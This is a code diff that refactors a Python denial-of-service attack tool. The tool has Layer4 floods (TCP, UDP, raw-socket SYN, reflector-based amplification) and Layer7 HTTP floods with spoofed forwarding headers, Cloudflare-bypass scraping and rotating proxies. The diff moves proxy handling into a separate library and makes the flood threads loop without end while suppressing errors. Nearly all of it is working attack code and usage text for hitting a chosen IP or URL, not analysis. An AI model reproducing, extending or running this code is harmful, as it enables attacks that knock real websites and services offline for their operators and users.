@@ -1,33 +1,30 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-from concurrent.futures import ThreadPoolExecutor
-from contextlib import suppress, contextmanager
-from functools import partial
+
+from contextlib import suppress
 from itertools import cycle
 from json import load
 from math import trunc, log2
-from multiprocessing import Pool
 from os import urandom as randbytes
 from pathlib import Path
 from random import randint, choice as randchoice
-from re import compile
-from socket import (IP_HDRINCL, IPPROTO_IP, inet_ntoa, IPPROTO_TCP, TCP_NODELAY, SOCK_STREAM, AF_INET, SOL_TCP, socket,
+from socket import (IP_HDRINCL, IPPROTO_IP, IPPROTO_TCP, TCP_NODELAY, SOCK_STREAM, AF_INET, socket,
                     SOCK_DGRAM, SOCK_RAW, gethostname)
 from ssl import SSLContext, create_default_context, CERT_NONE
-from string import ascii_letters
-from struct import pack as data_pack
 from sys import argv, exit
 from threading import Thread, Event, Lock
 from time import sleep
 from typing import Set, List, Any, Tuple
+from urllib import parse
 
+from PyRoxy import Proxy, Tools as ProxyTools, ProxyUtiles, ProxyType, ProxyChecker
 from certifi import where
 from cloudscraper import create_scraper
 from icmplib import ping
 from impacket.ImpactPacket import IP, TCP, UDP, Data
 from psutil import process_iter, net_io_counters, virtual_memory, cpu_percent
 from requests import get, Session, exceptions
-from socks import socksocket, HTTP, SOCKS5, SOCKS4
+from socks import socksocket
 from yarl import URL
 
 localIP = get('http://ip.42.pl/raw').text
@@ -51,9 +48,6 @@ class Methods:
 
 
 class Tools:
-    randString = lambda length: ''.join(randchoice(ascii_letters) for _ in range(length))
-    randIPv4 = lambda: inet_ntoa(data_pack('>I', randint(1, 0xffffffff)))
-
     @staticmethod
     def humanbytes(i: int, binary: bool = False, precision: int = 2):
         MULTIPLES = ["B", "k{}B", "M{}B", "G{}B", "T{}B", "P{}B", "E{}B", "Z{}B", "Y{}B"]
@@ -74,31 +68,6 @@ class Tools:
             return f'{num / 1000.0 ** obje:.{precision}f}{suffixes[obje]}'
         else:
             return num
-
-
-class Proxy:
-    port: int
-    host: str
-    typeInt: int
-
-    def __init__(self, host: str, port: int, typeInt: int) -> None:
-        self.host = host
-        self.port = port
-        self.typeInt = typeInt
-        self._typeName = "SOCKS4" if typeInt == 4 else \
-            "SOCKS5" if typeInt == 5 else \
-                "HTTP"
-
-    def __str__(self):
-        return "%s:%d" % (self.host, self.port)
-
-    def __repr__(self):
-        return "%s:%d" % (self.host, self.port)
-
-    def toRequests(self):
-        return {'http': "%s://%s:%d" % (self._typeName.lower(),
-                                        self.host,
-                                        self.port)}
 
 
 class Layer4(Thread):
@@ -123,8 +92,9 @@ class Layer4(Thread):
     def run(self) -> None:
         if self._synevent: self._synevent.wait()
         self.select(self._method)
-        while self._synevent.is_set():
-            self.SENT_FLOOD()
+        while 1:
+            with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError):
+                self.SENT_FLOOD()
 
     def select(self, name):
         self.SENT_FLOOD = self.TCP
@@ -159,16 +129,14 @@ class Layer4(Thread):
             self._amp_payloads = cycle(self._generate_amp())
 
     def TCP(self) -> None:
-        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
-                socket(AF_INET, SOCK_STREAM, SOL_TCP) as s:
+        with socket(AF_INET, SOCK_STREAM) as s:
             s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
             s.connect(self._target)
             while s.send(randbytes(1024)):
                 continue
 
     def MINECRAFT(self) -> None:
-        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
-                socket(AF_INET, SOCK_STREAM, SOL_TCP) as s:
+        with socket(AF_INET, SOCK_STREAM) as s:
             s.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
             s.connect(self._target)
 
@@ -178,28 +146,24 @@ class Layer4(Thread):
                 s.send(b'\x00')
 
     def UDP(self) -> None:
-        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
-                socket(AF_INET, SOCK_DGRAM) as s:
+        with socket(AF_INET, SOCK_DGRAM) as s:
             while s.sendto(randbytes(1024), self._target):
                 continue
 
     def SYN(self) -> None:
-        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
-                socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
+        with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
             while s.sendto(self._genrate_syn(), self._target):
                 continue
 
     def AMP(self) -> None:
-        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
-                socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
+        with socket(AF_INET, SOCK_RAW, IPPROTO_TCP) as s:
             s.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
             while s.sendto(*next(self._amp_payloads)):
                 continue
 
     def VSE(self) -> None:
-        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
-                socket(AF_INET, SOCK_DGRAM) as s:
+        with socket(AF_INET, SOCK_DGRAM) as s:
             while s.sendto((b'\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65'
                             b'\x20\x51\x75\x65\x72\x79\x00'), self._target):
                 continue
@@ -249,15 +213,15 @@ class HttpFlood(Thread):
     def __init__(self, target: URL, method: str = "GET", rpc: int = 1,
                  synevent: Event = None, useragents: Set[str] = None,
                  referers: Set[str] = None,
-                 proxy_type: int = 1,
                  proxies: Set[Proxy] = None) -> None:
         super().__init__(daemon=True)
         self.SENT_FLOOD = None
         self._synevent = synevent
         self._rpc = rpc
         self._method = method
-        self._proxy_type = self.getProxyType(list(({proxy_type} & {1, 4, 5}) or 1)[0])
         self._target = target
+        self._raw_target = (self._target.host, (self._target.port or 80))
+
         if not referers:
             referers: List[str] = ["https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
                                    ",https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer"
@@ -295,12 +259,13 @@ class HttpFlood(Thread):
     def run(self) -> None:
         if self._synevent: self._synevent.wait()
         self.select(self._method)
-        while self._synevent.is_set():
-            self.SENT_FLOOD()
+        while 1:
+            with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError):
+                self.SENT_FLOOD()
 
     @property
     def SpoofIP(self) -> str:
-        spoof: str = Tools.randIPv4()
+        spoof: str = ProxyTools.Random.rand_ipv4()
         payload: str = ""
         payload += "X-Forwarded-Proto: Http\r\n"
         payload += f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
@@ -315,24 +280,26 @@ class HttpFlood(Thread):
         payload += "Host: %s\r\n" % self._target.authority
         payload += self.randHeadercontent
         payload += other if other else ""
+        print(payload)
         return str.encode(f"{payload}\r\n")
 
-    def setup_socksocket(self, sock) -> socksocket:
+    def open_connection(self) -> socksocket:
+        sock = socksocket(AF_INET, SOCK_STREAM)
         if self._proxies:
-            proxy: Proxy = next(self._proxies)
-            sock.set_proxy(self._proxy_type, proxy.host, proxy.port)
-        if self._target.scheme == "https":
+            sock = next(self._proxies).wrap(sock)
+
+        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
+        if self._target.scheme.lower() == "https":
             sock = ctx.wrap_socket(sock, server_hostname=self._target.host, server_side=False,
                                    do_handshake_on_connect=True, suppress_ragged_eofs=True)
-        sock.setsockopt(IPPROTO_TCP, TCP_NODELAY, 1)
-        sock.connect((self._target.host, self._target.port or 80))
+        sock.connect(self._raw_target)
         return sock
 
     @property
     def randHeadercontent(self) -> str:
         payload: str = ""
         payload += f"User-Agent: {randchoice(self._useragents)}\r\n"
-        payload += f"Referrer: {randchoice(self._referers)}\r\n"
+        payload += f"Referrer: {randchoice(self._referers)}{parse.quote(self._target.human_repr())}\r\n"
         payload += self.SpoofIP
         return payload
 
@@ -348,10 +315,9 @@ class HttpFlood(Thread):
         payload: bytes = self.generate_payload((f"Content-Length: {32}\r\n"
                                                 "X-Requested-With: XMLHttpRequest\r\n"
                                                 "Content-Type: application/x-www-form-urlencoded; charset=utf-8\r\n\n"
-                                                f"data={Tools.randString(32)}\r\n"))
+                                                f"data={ProxyTools.Random.rand_str(32)}\r\n"))
 
-        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), self.setup_socksocket(
-                socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:
+        with self.open_connection() as s:
             for _ in range(self._rpc):
                 s.send(payload)
 
@@ -359,12 +325,11 @@ class HttpFlood(Thread):
         payload: bytes = self.generate_payload((f"Content-Length: {2048}\r\n"
                                                 "X-Requested-With: XMLHttpRequest\r\n"
                                                 "Content-Type: application/x-www-form-urlencoded; charset=utf-8\r\n\n"
-                                                f"data={Tools.randString(2048)}\r\n"
-                                                "Cookie: %s=%s" % (Tools.randString(12),
-                                                                   Tools.randString(100))))
+                                                f"data={ProxyTools.Random.rand_str(2048)}\r\n"
+                                                "Cookie: %s=%s" % (ProxyTools.Random.rand_str(12),
+                                                                   ProxyTools.Random.rand_str(100))))
 
-        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), self.setup_socksocket(
-                socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:
+        with self.open_connection() as s:
             for _ in range(self._rpc):
                 s.send(payload)
 
@@ -373,41 +338,36 @@ class HttpFlood(Thread):
                                                " _gat=1;"
                                                " __cfduid=dc232334gwdsd23434542342342342475611928;"
                                                " %s=%s\r\n" % (randint(1000, 99999),
-                                                               Tools.randString(6),
-                                                               Tools.randString(32)))
+                                                               ProxyTools.Random.rand_str(6),
+                                                               ProxyTools.Random.rand_str(32)))
 
-        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), self.setup_socksocket(
-                socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:
+        with self.open_connection() as s:
             for _ in range(self._rpc):
                 s.send(payload)
 
     def PPS(self) -> None:
-        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), self.setup_socksocket(
-                socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:
+        with self.open_connection() as s:
             for _ in range(self._rpc):
                 s.send(self._defaultpayload)
 
     def GET(self) -> None:
         payload: bytes = self.generate_payload()
 
-        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), self.setup_socksocket(
-                socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:
+        with self.open_connection() as s:
             for _ in range(self._rpc):
                 s.send(payload)
 
     def EVEN(self) -> None:
         payload: bytes = self.generate_payload()
 
-        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), self.setup_socksocket(
-                socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:
+        with self.open_connection() as s:
             while s.send(payload) and s.recv(1):
                 continue
 
     def OVH(self) -> None:
         payload: bytes = self.generate_payload()
 
-        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), self.setup_socksocket(
-                socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:
+        with self.open_connection() as s:
             for _ in range(min(self._rpc, 5)):
                 s.send(payload)
 
@@ -415,79 +375,80 @@ class HttpFlood(Thread):
         pro = None
         if self._proxies:
             pro = next(self._proxies)
-        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
-                create_scraper() as s:
+        with create_scraper() as s:
+            if pro: s = pro.wrap(s)
             for _ in range(self._rpc):
-                if pro:
-                    s.get(self._target.human_repr(), proxies=pro.toRequests())
-                    continue
                 s.get(self._target.human_repr())
 
     def AVB(self):
         pro = None
         if self._proxies:
             pro = next(self._proxies)
-        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
-                Session() as s:
+        with Session() as s:
+            if pro: s = pro.wrap(s)
             for _ in range(self._rpc):
-                if pro:
-                    s.post(self._target.human_repr(), proxies=pro.toRequests())
-                    continue
                 s.post(self._target.human_repr())
 
     def DGB(self):
-        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
-                create_scraper() as s:
+        with create_scraper() as s:
             for _ in range(min(self._rpc, 5)):
                 sleep(min(self._rpc, 5) / 100)
                 if self._proxies:
                     pro = next(self._proxies)
-                    s.get(self._target.human_repr(), proxies=pro.toRequests())
+                    s.get(self._target.human_repr(), proxies=pro.asRequests())
                     continue
                 s.get(self._target.human_repr())
 
     def DYN(self):
         payload: str | bytes = self._payload
-        payload += "Host: %s.%s\r\n" % (Tools.randString(6), self._target.authority)
+        payload += "Host: %s.%s\r\n" % (ProxyTools.Random.rand_str(6), self._target.authority)
         payload += self.randHeadercontent
         payload += self.SpoofIP
         payload = str.encode(f"{payload}\r\n")
 
-        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), self.setup_socksocket(
-                socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:
+        with self.open_connection() as s:
             for _ in range(self._rpc):
                 s.send(payload)
 
     def GSB(self):
-        payload: str | bytes = self._payload
-        payload += "Host: %s?q=%s\r\n" % (self._target.authority, Tools.randString(6))
+        payload = "%s %s?qs=%s HTTP/1.1\r\n" % (self._req_type, self._target.raw_path_qs, ProxyTools.Random.rand_str(6))
+        payload = (payload +
+                   'Accept-Encoding: gzip, deflate, br\r\n'
+                   'Accept-Language: en-US,en;q=0.9\r\n'
+                   'Cache-Control: max-age=0\r\n'
+                   'Connection: Keep-Alive\r\n'
+                   'Sec-Fetch-Dest: document\r\n'
+                   'Sec-Fetch-Mode: navigate\r\n'
+                   'Sec-Fetch-Site: none\r\n'
+                   'Sec-Fetch-User: ?1\r\n'
+                   'Sec-Gpc: 1\r\n'
+                   'Pragma: no-cache\r\n'
+                   'Upgrade-Insecure-Requests: 1\r\n')
+        payload += "Host: %s\r\n" % self._target.authority
         payload += self.randHeadercontent
         payload += self.SpoofIP
         payload = str.encode(f"{payload}\r\n")
 
-        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), self.setup_socksocket(
-                socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:
+        with self.open_connection() as s:
             for _ in range(self._rpc):
                 s.send(payload)
 
     def NULL(self) -> None:
         payload: str | bytes = self._payload
-        payload += "Host: %s\r\n" % self._target.raw_authority
+        payload += "Host: %s\r\n" % self._target.authority
         payload += "User-Agent: null\r\n"
         payload += "Referrer: null\r\n"
         payload += self.SpoofIP
         payload = str.encode(f"{payload}\r\n")
 
-        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), self.setup_socksocket(
-                socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:
+        with self.open_connection() as s:
             for _ in range(self._rpc):
                 s.send(payload)
 
     def SLOW(self):
         payload: bytes = self.generate_payload()
 
-        with suppress(OSError, ConnectionError, TimeoutError), self.setup_socksocket(
-                socksocket(AF_INET, SOCK_STREAM, SOL_TCP)) as s:
+        with self.open_connection() as s:
             for _ in range(self._rpc):
                 s.send(payload)
             while s.send(payload) and s.recv(1):
@@ -511,72 +472,38 @@ class HttpFlood(Thread):
         if name == "COOKIE": self.SENT_FLOOD = self.COOKIES
         if name == "PPS":
             self.SENT_FLOOD = self.PPS
-            self._defaultpayload = (self._defaultpayload + "\r\n").encode()
+            self._defaultpayload = (self._defaultpayload + "Host: %s\r\n\r\n" % self._target.authority).encode()
         if name == "EVEN": self.SENT_FLOOD = self.EVEN
 
     def BYPASS(self):
         pro = None
         if self._proxies:
             pro = next(self._proxies)
-        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError), \
-                Session() as s:
+        with Session() as s:
+            if pro: s = pro.wrap(s)
             for _ in range(self._rpc):
-                if pro:
-                    s.get(self._target.human_repr(), proxies=pro.toRequests())
-                    continue
                 s.get(self._target.human_repr())
 
-    @staticmethod
-    def getProxyType(typeInt: int):
-        return SOCKS4 if typeInt == 4 else \
-            SOCKS5 if typeInt == 5 else \
-                HTTP
-
-
-class Regex:
-    IP = compile(r"(?:\d{1,3}\.){3}\d{1,3}")
-    IPPort = compile(r"((?:\d{1,3}\.){3}\d{1,3})[:](\d+)")
 
 
 class ProxyManager:
-
     @staticmethod
     def DownloadFromConfig(cf, Proxy_type: int) -> Set[Proxy]:
         proxes: Set[Proxy] = set()
         lock = Lock()
-        with ThreadPoolExecutor(max_workers=len(cf["proxy-providers"])) as executor:
-            for provider in cf["proxy-providers"]:
-                if Proxy_type != provider["type"]: continue
-                print(provider)
-                executor.submit(ProxyManager.download(provider, proxes, lock))
-
+        for provider in cf["proxy-providers"]:
+            if provider["type"] != Proxy_type and Proxy_type != 0: continue
+            print("Downloading Proxies form %s" % provider["url"])
+            ProxyManager.download(provider, proxes, lock, ProxyType.stringToProxyType(provider["type"]))
         return proxes
 
     @staticmethod
-    def download(provider, proxes: Set[Proxy], threadLock: Lock) -> Any:
+    def download(provider, proxes: Set[Proxy], threadLock: Lock, proxy_type: ProxyType) -> Any:
         with suppress(TimeoutError, exceptions.ConnectionError, exceptions.ReadTimeout):
             data = get(provider["url"], timeout=provider["timeout"]).text
-            for proy in Regex.IPPort.findall(data):
+            for proxy in ProxyUtiles.parseAll(data, proxy_type):
                 with threadLock:
-                    proxes.add(Proxy(proy[0], int(proy[1]), provider["type"]))
-    @contextmanager
-    def poolcontext(*args, **kwargs) -> Pool:
-        pool = Pool(*args, **kwargs)
-        yield pool
-        pool.terminate()
-
-    @staticmethod
-    def checkProxy(pxy: Proxy, url: str = "http://google.com", timeout: int = 1) -> Tuple[bool, Proxy]:
-        with suppress(OSError, ConnectionError, TimeoutError, BrokenPipeError):
-            return get(url, proxies=pxy.toRequests(), timeout=timeout).status_code not in [403, 400], pxy
-        return False, pxy
-
-    @staticmethod
-    def checkAll(proxie: Set[Proxy], url: str = "http://google.com", timeout: int = 1, threads=100) -> Set[Proxy]:
-        print(f"{len(proxie):,} Proxies are getting checked, this may take awhile !")
-        with ProxyManager.poolcontext(min(len(proxie), threads)) as pool:
-            return {pro[1] for pro in pool.map_async(partial(ProxyManager.checkProxy, url=url, timeout=timeout), proxie).get() if
-                    pro[0]}
+                    proxes.add(proxy)
 
 
 class ToolsConsole:
@@ -758,7 +685,8 @@ class ToolsConsole:
                'Note: If the Proxy list is empty, the attack will run without proxies\n'
                '      If the Proxy file doesn\'t exist, the script will download proxies and check them.\n'
                ' Layer7: python3 %s <method> <url> <socks_type5.4.1> <threads> <proxylist> <rpc> <duration>\n'
-               ' Layer4: python3 %s <method> <ip:port> <threads> <duration> <reflector file, (only use with Amplification>\n'
+               ' Layer4: python3 %s <method> <ip:port> <threads> <duration> <reflector file, (only use with '
+               'Amplification>\n'
                '\n'
                ' > Methods:\n'
                ' - Layer4\n'
@@ -846,25 +774,24 @@ if __name__ == '__main__':
                         proxy_li.parent.mkdir(parents=True, exist_ok=True)
                         with proxy_li.open("w") as wr:
                             Proxies: Set[Proxy] = ProxyManager.DownloadFromConfig(con, proxy_ty)
-                            Proxies = ProxyManager.checkAll(Proxies, url.human_repr(), 1, threads)
+                            Proxies = ProxyChecker.checkAll(Proxies, url.human_repr(), 1, threads)
                             if not Proxies:
-                                exit("Proxy Check failed, Your network may be the problem | The target may not be available.")
+                                exit(
+                                    "Proxy Check failed, Your network may be the problem | The target may not be"
+                                    " available.")
                             stringBuilder = ""
                             for proxy in Proxies:
                                 stringBuilder += (proxy.__str__() + "\n")
                             wr.write(stringBuilder)
 
-                    with proxy_li.open("r+") as rr:
-                        for pro in Regex.IPPort.findall(rr.read()):
-                            proxies.add(Proxy(pro[0], int(pro[1]), proxy_ty))
-
+                    proxies = ProxyUtiles.readFromFile(proxy_li)
                     if not proxies:
                         print("Empty Proxy File, Running flood witout proxy")
                         proxies = None
                     if proxies:
-                        print(f"Proxy Count: {len(proxies):,}" )
+                        print(f"Proxy Count: {len(proxies):,}")
                     for _ in range(threads):
-                        HttpFlood(url, method, rpc, event, uagents, referers, proxy_ty, proxies).start()
+                        HttpFlood(url, method, rpc, event, uagents, referers, proxies).start()
 
                 if method in Methods.LAYER4_METHODS:
                     target = argv[2].strip()
@@ -880,7 +807,7 @@ if __name__ == '__main__':
                         target = target.split(":")[0]
 
                     if 65535 < port or port < 1: exit("Invalid Port [Min: 1 / Max: 65535] ")
-                    if not Regex.IP.match(target): exit("Invalid Ip Selected")
+                    if not ProxyTools.Patterns.IP.match(target): exit("Invalid Ip Selected")
 
                     if method in {"NTP", "DNS", "RDP", "CHAR", "MEM", "ARD", "SYN"} and \
                             not ToolsConsole.checkRawSocket(): exit("Cannot Create Raw Socket ")
@@ -889,18 +816,16 @@ if __name__ == '__main__':
                         if len(argv) == 6:
                             refl_li = Path(currentDir / "files" / argv[5].strip())
                             if not refl_li.exists(): exit("The Reflector file doesn't exist ")
-                            ref = set(a.strip() for a in Regex.IP.findall(refl_li.open("r+").read()))
+                            ref = set(a.strip() for a in ProxyTools.Patterns.IP.findall(refl_li.open("r+").read()))
                         if not ref: exit("Empty Reflector File ")
 
                     for _ in range(threads):
                         Layer4((target, port), ref, method, event).start()
 
-                sleep(5)
                 print("Attack Started !")
                 event.set()
                 while timer:
                     timer -= 1
                     sleep(1)
-                event.clear()
                 exit()
             ToolsConsole.usage()
